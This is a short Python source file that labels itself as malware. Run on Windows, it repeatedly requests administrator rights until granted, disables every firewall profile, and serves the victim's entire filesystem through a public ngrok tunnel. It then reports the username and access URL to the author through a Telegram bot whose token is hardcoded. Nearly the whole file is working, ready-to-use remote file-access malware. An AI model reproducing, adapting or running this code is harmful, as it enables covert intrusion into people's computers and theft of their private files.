# Malware Made By George (Usdchef)

import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
import os
import  threading
import sys,ctypes
import subprocess
import requests
from pyngrok import ngrok
from  getpass import  getuser
public_url = ngrok.connect(8080)
__author__ = "George"
bottoken = "6198001528:AAFOl37fPOGb83G8dMlrFI7UpXUFzUXMXpg"
chatid = ""
def sendtg(msg, bot, chatid):
    url = "https://api.telegram.org/bot" + bot + "/sendMessage?chat_id=" + chatid + "&text=" + msg
    requests.get(url)
def request_admin_permissions():
    exe_path = os.path.realpath(sys.executable)

    if ctypes.windll.shell32.IsUserAnAdmin() == 0:

        while True:

            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_path, "", None, 1)

            if result > 32:
                break

def kill():
    subprocess.Popen('netsh advfirewall set currentprofile state off', shell=True)

    subprocess.Popen('netsh advfirewall set privateprofile state off', shell=True)

    subprocess.Popen('netsh advfirewall set publicprofile state off', shell=True)


drive_letters = [chr(x) for x in range(ord('A'), ord('Z')+1)]
class MyHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/change_drive"):
            query_string = urllib.parse.urlsplit(self.path).query
            query_params = urllib.parse.parse_qs(query_string)
            drive = query_params.get("drive", [None])[0]
            if drive and drive in drive_letters:
                os.chdir(drive + ":\\")
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(bytes("Drive changed to " + drive + ":\\", "utf8"))
            else:
                self.send_response(400)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(bytes("Invalid drive letter", "utf8"))
        else:
            return SimpleHTTPRequestHandler.do_GET(self)

    def translate_path(self, path):
        path = os.getcwd() + path
        return SimpleHTTPRequestHandler.translate_path(self, path)

httpd = HTTPServer(('', 8080), MyHandler)

try:
    request_admin_permissions()
    kill()
    th = threading.Thread(target=httpd.serve_forever)
    th.start()
    sendtg(msg="Got 1 Username:"+getuser()+"\n To acces your target files open "+str(public_url),bot=bottoken,chatid=chatid)
except Exception as e:
    print(e)
